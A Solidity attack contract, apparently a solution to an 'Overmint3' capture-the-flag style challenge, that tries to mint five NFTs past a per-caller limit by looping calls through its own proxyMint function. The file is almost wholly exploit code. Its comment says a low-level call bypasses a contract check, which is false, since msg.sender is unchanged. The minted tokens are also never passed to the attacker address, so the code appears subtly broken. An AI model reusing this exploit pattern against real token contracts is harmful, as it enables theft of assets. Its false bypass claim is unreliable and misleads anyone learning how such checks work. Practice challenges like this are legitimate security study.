// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../Overmint3.sol";

contract AttackContract is IERC721Receiver {
    Overmint3 public target;
    address public attacker;

    constructor(address _target) {
        target = Overmint3(_target);
        attacker = msg.sender;
    }

    function exploit() external {
        // Mint 5 NFTs through contract
        for (uint256 i = 0; i < 5; i++) {
            this.proxyMint();
        }
    }

    function proxyMint() external {
        // Use low-level call to bypass contract check
        (bool success, ) = address(target).call(
            abi.encodeWithSignature("mint()")
        );
        require(success, "Mint failed");
    }

    function onERC721Received(
        address, 
        address, 
        uint256, 
        bytes calldata
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}